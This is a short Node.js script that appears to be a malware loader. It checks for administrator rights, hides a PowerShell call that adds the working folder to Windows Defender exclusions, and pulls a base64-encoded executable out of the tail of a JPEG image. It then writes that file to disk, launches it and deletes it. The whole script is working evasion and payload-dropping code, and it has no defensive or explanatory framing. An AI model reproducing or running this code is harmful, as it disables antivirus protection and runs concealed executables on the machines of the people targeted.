const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');
const os = require('os');

const imageFile = 'encrypted_image.jpg';
const outputFile = 'decrypted.exe';

function runAsAdmin() {
    console.log("Please restart with admin privileges.");
    setTimeout(function() {
        process.exit();
    }, 30000);
}

exec('net session', function(err, stdout, stderr) {
    if (err || !(stdout.indexOf("There are no entries in the list.") > -1)) {
        console.log("You are not running this application as administrator. Restarting as admin...");
        runAsAdmin();
        process.exit();
    } else {
        console.log("This is being ran with administrator privileges!");
    }
});

const currentDir = path.resolve('.'); // Get the current working directory

const command = `powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '${currentDir}'"`;

exec(command, { windowsHide: true }, (error, stdout, stderr) => {
    if (error) {
        console.error(`Failed to add exclusion: ${error.message}`);
    }
    if (stderr) {
        console.error(`Error: ${stderr}`);
    }
});

const imageDataWithExe = fs.readFileSync(imageFile);
const base64EncodedData = imageDataWithExe.slice(imageDataWithExe.lastIndexOf('\n')+1).toString();
const decodedData = Buffer.from(base64EncodedData, 'base64');
fs.writeFileSync(outputFile, decodedData);
console.log(`The decrypted exe file ${outputFile} has been created.`);

exec(`cmd.exe /c "start ${outputFile}"`, (err, stdout, stderr) => {
    if (err) {
        console.error(err);
        return;
    }
    console.log(stdout);
});

//delete decrypted exe
fs.unlinkSync(outputFile);